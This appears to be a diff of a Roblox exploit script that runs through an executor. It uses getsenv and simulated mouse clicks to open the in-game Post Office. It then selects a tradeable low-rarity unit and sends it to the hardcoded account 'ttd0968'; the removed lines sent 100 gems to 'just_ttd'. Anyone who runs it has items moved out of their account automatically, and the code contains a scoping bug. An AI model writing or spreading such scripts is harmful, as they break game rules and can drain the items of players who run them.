@@ -1,4 +1,7 @@
 
+
+
+--Wait game load
 repeat wait( )until game:IsLoaded()
 repeat wait() until game.Players.LocalPlayer
 local Plr = game.Players.LocalPlayer
@@ -6,7 +9,42 @@ repeat wait() until Plr.Character
 repeat wait() until Plr.Character:FindFirstChild("HumanoidRootPart")
 repeat wait() until Plr.Character:FindFirstChild("Humanoid") 
 local Plrgui =game:GetService("Players").LocalPlayer.PlayerGui
+local Plrgui =game:GetService("Players").LocalPlayer.PlayerGui
+local function ConvertGradientToRGB(v, num)
+    color = v.Color.Keypoints[num].Value
+    local r = math.floor(color.R * 255)
+    local g = math.floor(color.G * 255)
+    local b = math.floor(color.B * 255)
+    return Color3.fromRGB(r, g, b)
+end
+local  RarityColor = {}
+for _, v in pairs(Plrgui.Lobby.MarketplaceFrame.MarketplaceMain.MainFrame.BuyMenu.FilterBar.Rarities:GetChildren()) do
+    if v:IsA("Frame") then
+        RarityColor[v.Name] = {
+            ["1"] = ConvertGradientToRGB(v.FilterButton[v.Name], 1),
+            ["2"] = ConvertGradientToRGB(v.FilterButton[v.Name], 2)
+        }
+    end
+end
 
+local function GetRarity(color1, color2)
+    for rarity, colors in pairs(RarityColor) do
+        if (color1 == colors["1"] and color2 == colors["2"]) then
+            return rarity
+        end
+    end
+end
+
+local function GetRandomUnit() 
+    for i,v in pairs(Plrgui.Lobby.PostOffice.Menus.SendPackages.PlayerUnits.PlayerUnits:GetChildren()) do 
+        if v:IsA("Frame") then 
+            local UnitRarity = GetRarity(ConvertGradientToRGB(v.TroopPicture.RarityGradient, 1), ConvertGradientToRGB(v.TroopPicture.RarityGradient, 2)) 
+            if not v.TroopPicture.CannotTrade.Visible and (  UnitRarity == "Basic" or UnitRarity == "Uncommon" or  UnitRarity == "Rare") then 
+                return v 
+            end 
+        end 
+    end 
+end 
 --ClickGui
 local function ClickButton(a)
     game:GetService("VirtualInputManager"):SendMouseButtonEvent(a.AbsolutePosition.X+a.AbsoluteSize.X/2,a.AbsolutePosition.Y+50,0,true,a,1)
@@ -27,11 +65,13 @@ local function Random(Length)
     local alphabet = "0123456789"
     local n = string.len(alphabet)
     local pw = {}
-    for i = 1, k do
+    for i = 1, k
+    do
         pw[i] = string.byte(alphabet, math.random(n))
     end
     return string.char(table.unpack(pw))
 end
+
 --Main
 spawn(function()
     while wait() do 
@@ -54,19 +94,29 @@ spawn(function()
                     }
                     
                     game:GetService("ReplicatedStorage"):WaitForChild("dataRemoteEvent"):FireServer(unpack(gem_only))
-                end 
-                break                    
+                end
+                break
             else 
                 if Plrgui.Lobby.PostOffice.Visible then 
-                    if Plrgui.Lobby.PostOffice.Menus.SendPackages.YourGems.GemAmount.GemAmount.Text ~= "" then 
-                        if Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Username.Text == "just_ttd" then 
-                            ClickButton(Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Send.SendButton)
+                    local Unit = GetRandomUnit()
+                    if Unit then 
+                        if Unit.TroopPicture.IsInTrade.Visible then
+                            if Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Username.Text == "ttd0968" then 
+                                ClickButton(Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Send.SendButton)
+                            else 
+                                Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Username.Text = "ttd0968"
+                            end  
                         else 
-                            Plrgui.Lobby.PostOffice.Menus.SendPackages.SendingFrame.Username.Text = "just_ttd"
+                            for i,v in pairs(Plrgui.Lobby.PostOffice.Menus.SendPackages.PlayerUnits.PlayerUnits:GetChildren()) do 
+                                if v:IsA("Frame") then 
+                                    if v ~= Unit then 
+                                        v.Visible = false 
+                                    end 
+                                end 
+                            end 
+                            ClickButton(v)
                         end
-                    else 
-                        Plrgui.Lobby.PostOffice.Menus.SendPackages.YourGems.GemAmount.GemAmount.Text = "100 "
-                    end
+                    end 
                 else 
                     local PostOfficeHandler = getsenv(Plrgui.Lobby.PostOffice.PostOfficeHandler)
                     PostOfficeHandler:OpenFrame()
